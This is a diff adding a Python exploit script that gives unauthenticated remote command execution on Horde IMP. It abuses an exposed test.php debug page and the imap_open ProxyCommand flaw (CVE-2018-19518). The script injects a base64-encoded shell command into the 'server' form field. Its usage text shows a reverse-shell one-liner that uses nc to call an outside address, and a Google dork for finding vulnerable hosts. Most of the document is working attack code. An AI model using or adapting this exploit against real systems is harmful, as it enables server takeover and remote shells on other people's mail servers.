@@ -1,0 +1,74 @@
+# Exploit Title: Horde Imp Unauthenticated Remote Command Execution 
+# Google Dork: inurl:/imp/login.php
+# Date: 10/01/2019
+# Exploit Author: Paolo Serracino - Pietro Minniti - Damiano Proietti
+# Vendor Homepage: https://www.horde.org/apps/imp/
+# Software Link: https://www.horde.org/download/imp
+# Version: All IMP versions
+# Tested on: Debian/Ubuntu
+
+import requests
+import sys
+import base64 
+import random
+import string 
+
+'''
+ --------------------------------------------------------------------------------------------
+| Paolo Serracino - Pietro Minniti - Damiano Proietti - @OmnitechIT                           |
+| Horde Imp Unauthenticated Command Execution via imap_open function in exposed debug page   |
+ --------------------------------------------------------------------------------------------
+
+Horde Imp, an application that comes with the Horde GroupWare/Webmail suite exposes an unauthenticated debug page with a form 
+that permits IMAP requests to arbitrary hosts. The page is at http://horde_path/imp/test.php and should be deleted after installation.
+Leveraging the CVE 2018-19518 and no input sanitization is possible to execute shell commands.
+Tested on Debian/Ubuntu.
+'''
+
+def check(target):
+
+   try:
+      res_check = requests.get(target)
+      if 'PHP Mail Server Support Test' in res_check.text and 'PHP Major Version: 5.' in res_check.text:
+         print("[+] Target is most likely vulnerable")
+         return True
+      else:
+         print("[-] Target doesn't look vulnerable")   
+         sys.exit()
+   
+   except requests.exceptions.RequestException as e:
+      print("[-] Connection Issue")   
+   
+
+
+def exploit(target,cmd):
+
+   cmd= base64.b64encode(cmd)
+   payload1 = random.choice(string.ascii_letters) 
+   new_headers = ({'User-Agent':'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)',
+                 'Referer':target,
+                 'Cookie':'Horde=klstwo9u52kw7iqy4i22i0iok1;auth_key=klstwo9u52kw7iqy4i22i0iok1;imp_key=klstwo9u52kw7iqy4i22i0iok1;' 
+                })
+
+   res = requests.post(target,headers=new_headers,data=[('server',payload1 + ' -oProxyCommand=echo$IFS$()' + cmd + '|base64$IFS$()-d|sh}'), #in order to avoid url encoding by requests
+                                                        ('port','143'),
+                                                        ('user','a'),
+                                                        ('passwd','a'),
+                                                        ('server_type','imap'),
+                                                        ('f_submit','Submit')
+                                                        ])
+   print('[+] Sent!')
+
+
+if(len(sys.argv)) < 3:
+ 
+   print("[+] First argument is the path of target's Horde test.php and second the payload as a shell command")
+   print('[+] Enclose shell commands between double quotes')
+   print('[+] example python horde_imap_cmd.py http://127.0.0.1/horde/imp/test.php "mknod /tmp/bk p; nc 192.168.1.17 443 0</tmp/bk | /bin/bash 1>/tmp/bk"')
+   sys.exit()
+
+target = sys.argv[1] #+ '/imp/test.php'
+cmd = sys.argv[2]
+
+if check(target):
+   exploit(target,cmd)
